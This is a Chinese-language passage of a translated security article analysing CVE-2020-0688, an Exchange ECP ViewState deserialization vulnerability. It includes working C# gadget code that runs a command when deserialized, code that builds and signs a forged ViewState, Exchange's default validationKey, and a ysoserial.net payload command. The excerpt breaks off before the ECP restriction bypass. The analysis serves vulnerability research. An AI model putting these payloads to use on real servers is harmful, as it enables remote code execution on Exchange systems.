# CVE-2020-0688的武器化与.net反序列化漏洞那些事
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
CVE-2020-0688是Exchange一个由于默认加密密钥造成的反序列化漏洞，该漏洞存在于Exchange Control
Panel(ecp)中，不涉及Exchange的工作逻辑，其本质上是一个`web漏洞`。
鉴于国内对.net安全的讨论少之又少，对此借助这篇文章分析一下漏洞详细原理以及利用中的一些细节部分，一方面证明其实际危害性；另一方面抛砖引玉，希望能集思广益，挖掘更好的利用方式。
全文测试环境为`Exchange 2013+Server 2012R2`/`Exchange 2016+Server
2016`。由于ecp的一些限制以及低版本.net反序列化利用的复杂性，暂时不讨论更低版本。
完整阅读本文至少需要`一小时`的时间。
## 0x10 背景知识：反序列化、ViewState与MachineKey
###  0x11 反序列化
.net
Framework(下称fx)原生支持多种序列化/反序列化方式，一些较为古老的系统和组件会使用`binary`和`soap`，而现在基本被`xml`和`json`所替代。
在`binary`序列化中有五个非常重要的类型：`Serializable`特性、`ISerializable`接口、`MarshalByRefObject`抽象类、`IDeserializationCallback`和`IObjectReference`接口。Serializable特性标记类可以进行`基于值`的序列化，MarshalByRefObject标记类可以进行`基于引用`的序列化，ISerializable接口`决定序列化行为`，IDeserializationCallback在反序列化过程中`还原对象状态`，IObjectReference实现`工厂模式`反序列化。
在序列化过程中由`SerializationInfo`保存序列化数据，可以粗略的将其理解为一个以`字符串`为键，以.net`基元类型`为值，以`字符串形式的程序集名称和类型名`进行包装的多层嵌套字典，形象一点的近似类比是注册表。
单纯标记Serializable特性的类会以`字段名`作为键，以`字段值`作为值，以字段值的`实际类型`作为类型名进行保存，等同于java中的Serializable接口的默认行为；实现ISerializable接口的类由`GetObjectData`方法控制SerializationInfo中的数据和类型，类似于java中定义在类型本身的writeObject和readObject或实现Externalizable接口的类；继承自MarshalByRefObject的类会写入一个`ObjRef`表示远程引用。
在反序列化过程中，首先会尝试调用具有`(SerializationInfo,StreamingContext)`签名的构造函数进行初始化，之后检测是否实现`IObjectReference`，如果实现则调用`GetRealObject`获取真实对象，否则返回对象本身。和java检测serialVersionUID不同，类型版本由SerializationInfo中保存的AssemblyName决定，其规则遵循clr默认程序集发现和加载策略，可认为是透明的。
fx的程序集中存在两个极为重要的工厂类：`[mscorlib]System.DelegateSerializationHolder`和`[System.Workflow.ComponentModel]System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate+ObjectSerializedRef`。按照微软的本意，只有标记了SerializableAttribute、实现ISerializable、继承自MarshalByRefObject的类才能进行序列化/反序列化。序列化操作的实现是完全没有问题的，而在反序列化操作中并没有要求返回类型满足上述约束（当然，这是特性而不是漏洞）。借助DelegateSerializationHolder，我们可以反序列化`任何委托`（无论方法、属性，也不分静态或实例）；而借助ObjectSerializedRef可实现`任意类`反序列化。
众所周知，委托实质上代表一个可以直接执行的.net方法。如果为序列化数据提供一个恶意委托（例如Process.Start(string)），那么在委托被调用时将实现代码执行。而实际上，在序列化时控制一个对象的某个方法的调用时机是比较麻烦的，所以借助`IObjectReference::GetRealObject`等在反序列化时会进行调用的方法是更好的选择。
基于以上结论，可以得到下面的测试代码，此代码中的Test类在进行反序列化时将导致命令执行：
    //build and run: c:windowsmicrosoft.netframeworkv4.0.30319csc test.cs && test
    using System;
    using System.Diagnostics;
    using System.Security.Cryptography;
    using System.IO;
    using System.Web;
    using System.Runtime.Serialization;
    using System.Runtime.Serialization.Formatters.Binary;
    [Serializable]
    class Test : IObjectReference
    {
        Func _dele;
        string _parm;
        public Test(Func dele, string parm)
        {
            _dele = dele;
            _parm = parm;
        }
        public Object GetRealObject(StreamingContext c)
        {
            return _dele(_parm);
        }
    }
    class a
    {
        static void Main(string[] args)
        {
            Test t = new Test(new Func(Process.Start), "notepad");
            byte[] data = Serialize(t);
            Console.WriteLine(Deserialize(data));
        }
        static object Deserialize(byte[] b)
        {
            using (MemoryStream mem = new MemoryStream(b))
            {
                mem.Position = 0;
                BinaryFormatter bf = new BinaryFormatter();
                return bf.Deserialize(mem);
            }
        }
        static byte[] Serialize(object obj)
        {
            using (MemoryStream mem = new MemoryStream())
            {
                BinaryFormatter bf = new BinaryFormatter();
                bf.Serialize(mem, obj);
                return mem.ToArray();
            }
        }
    }
所以我们只需要找到和上面代码相类似，且在fx或目标环境进行提供的类即可在真实环境中使用。限于篇幅，更细节的信息请参考ysoserial.net的`TypeConfuseDelegateGenerator`，其调用堆栈大致为：
    System.Diagnostics.Process.Start
    System.Collections.Generic.ComparisonComparer._comparison.Invoke
    System.Collections.Generic.ComparisonComparer::Compare
    System.Collections.Generic.SortedSet::OnDeserialization
    (after System.Collections.Generic.SortedSet::.ctor(SerializationInfo,StreamingContext))
###  0x12 ViewState
ViewState是asp.net的一个特性，由`[System.Web]System.Web.UI.Page`类进行实现，其目的是为服务端控件状态进行持久化。从开发的角度看，所谓“控件状态”实际上就是服务端控件的属性或字段。fx在实现时采用了类似于`ISerializable::GetObjectData`的行为，由控件本身决定如何进行保存。
具体的序列化流程由`[System.Web]System.Web.UI.ObjectStateFormatter`进行处理。其返回结果以`FF01`作为magic，后续数据是近似于`Type-Value`的格式。由于控件本身可能需要保存较为复杂的类型，ObjectStateFormatter通过`二进制序列化`方式对这种情况进行支持，其TypeCode为`0x32`，Value为带有`7bit-encoded`长度前缀的二进制序列化数据。
所以可以使用以下代码手动生成一个合法的ViewState：
    static byte[] GetViewState()
    {
      Test t = new Test(new Func(Process.Start), "notepad");
      byte[] data = Serialize(t);
      MemoryStream ms = new MemoryStream();
      ms.WriteByte(0xff);
      ms.WriteByte(0x01);
      ms.WriteByte(0x32);
      uint num = (uint)data.Length;
      while (num >= 0x80)
      {
          ms.WriteByte((byte)(num | 0x80));
          num = num >> 0x7;
      }
      ms.WriteByte((byte)num);
      ms.Write(data, 0, data.Length);
      return ms.ToArray();
    }
在asp.net环境中，每一个aspx文件都会（在发布期间或初始化期间）被编译为一个继承Page类的对象。访问对应的页面时由`[System.Web]System.Web.UI.PageHandlerFactory`进行查找并创建实例，之后调用`ProcessRequest`方法处理当前的HttpContext。在随后的`ProcessRequestMain`方法中，将判断是否处于`PostBack`状态，如果是则获取`Form`或`QueryString`中的`__VIEWSTATE`，并在`LoadAllState`方法中进行反序列化。
上述过程的调用堆栈大致为：
    System.Web.UI.ObjectStateFormatter.Deserialize
    System.Web.UI.Page.LoadAllState
    (if IsPostBack)
    System.Web.UI.Page.ProcessRequestMain
    System.Web.UI.Page.ProcessRequest
进入PostBack模式有两个条件：页面不是通过`Server.Transfer`进行重定向的，`__VIEWSTATE`等隐藏表单存在。默认直接访问页面即可满足上述条件。
###  0x13 ViewState验证、MacKeyModifier与MachineKey
由于ViewState完全由客户端传入，为了防止篡改，ObjectStateFormatter会使用`MachineKey`对信息进行加密或签名。在默认情况下，MachineKey由fx随机生成，长度为0x400；反序列化的数据不会进行加密，但会进行`HMACSha256`签名，计算出的签名将附加在数据最后。
高版本的fx添加了`MacKeyModifier`作为Salt，由`ClientId`和`ViewStateUserKey`两部分拼接而成。在默认情况下，ViewStateUserKey为`空`；ClientId的算法为当前页面`虚拟目录`路径与当前`页面类型名称`的HashCode之和，同时会以十六进制形式存放于名为`__VIEWSTATEGENERATOR的`隐藏表单中返回。
而即使ClientId不返回实际上也几乎没有影响：在不存在反向代理的情况下，最坏的黑盒情况依然可通过url逐级爆破获得当前页面虚拟路径；当前页面的类型名称则是固定的将请求路径中的句点(.)以及斜杠(/)替换为下划线(_)，例如`/a/b/c.aspx`最终的类型名为`a_b_c_aspx`。
无论加密还是解密时，ObjectStateFormatter都会根据对应的Page`重新计算`MacKeyModifier，客户端请求所发送的__VIEWSTATEGENERATOR`不参与`反序列化。
综上，在已知key的情况下，可以使用以下代码直接算出hash，以及最终的ViewState：
    byte[] data=GetViewState();
    byte[] key=new byte[]{0,1,2,3,4,5,6,7,8,9,0xa,0xb,0xc,0xd,0xe,0xf,0,1,2,3,4,5,6,7,8,9,0xa,0xb,0xc,0xd,0xe,0xf};
    int hashcode = StringComparer.InvariantCultureIgnoreCase.GetHashCode("/");
    uint _clientstateid=(uint)(hashcode+StringComparer.InvariantCultureIgnoreCase.GetHashCode("index_aspx"));
    byte[] _mackey = new byte[4];
    _mackey[0] = (byte)_clientstateid;
    _mackey[1] = (byte)(_clientstateid >> 8);
    _mackey[2] = (byte)(_clientstateid >> 16);
    _mackey[3] = (byte)(_clientstateid >> 24);
    MemoryStream ms = new MemoryStream();
    ms.Write(data,0,data.Length);
    ms.Write(_mackey,0,_mackey.Length);
    byte[] hash=(new HMACSHA256(key)).ComputeHash(ms.ToArray());
    ms=new MemoryStream();
    ms.Write(data,0,data.Length);
    ms.Write(hash,0,hash.Length);
    Console.WriteLine("__VIEWSTATE={0}&__VIEWSTATEGENERATOR={1}",
        HttpUtility.UrlEncode(Convert.ToBase64String(ms.ToArray())),
        _clientstateid.ToString("X2"));
编译上述代码，执行，复制输出。
在IIS的默认站点进行下列操作：确保应用程序池为`.net
4.0`，新建一个空白的`default.aspx`，将刚刚编译的exe复制到`bin`目录下，在`web.config`中添加MachineKey（如下）。
将前面复制的输出作为`QueryString`或`FormData`，访问default.aspx，会看到`w3wp.exe`创建了子进程notepad。
## 0x20 ecp的限制与初步利用
###  0x21 ecp的配置与限制
由于这是一个默认Key导致的漏洞，所以首先查看ecp的配置文件。配置文件存放在`%ExchangeInstallPath%ClientAccessecpweb.config`，可以看到其中默认的`validationKey`：`CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF`。
ecp当然不会存在前面用于测试的Test类，对反序列化非常熟悉的话可以查找一些可以利用的类。当然也可以偷个懒，借助ysoserial.net生成一个命令执行的payload：
    ysoserial.exe -g TypeConfuseDelegate -c notepad -f binaryformatter -o base64
修改上面的脚本生成ViewState，访问，无论GET还是POST均毫无疑问的返回`404`，将POST修改为GET进行伪装则返回`501`。
根据501页面的内容，很明显是请求被前置模块进行了过滤；GET返回404的原因是IIS默认限制QueryString最大长度为`2048`；POST返回404则是在web.config中`重写`了全部处理程序映射，禁止了绝大部分aspx文件的`POST`请求方法：
而几个允许POST的白名单中，Download.aspx并非通过PageHandlerFactory进行处理，其余的要么文件不存在，要么低权限用户无权访问。
必须找到对这些限制进行绕过的方式才能成功利用此漏洞。
###  0x22 无效的ViewStateUserKey
在查找绕过方式之前，让我们回过头来，计算一下已知的ViewState进行验证，以确保ecp不存在其他奇奇怪怪的配置。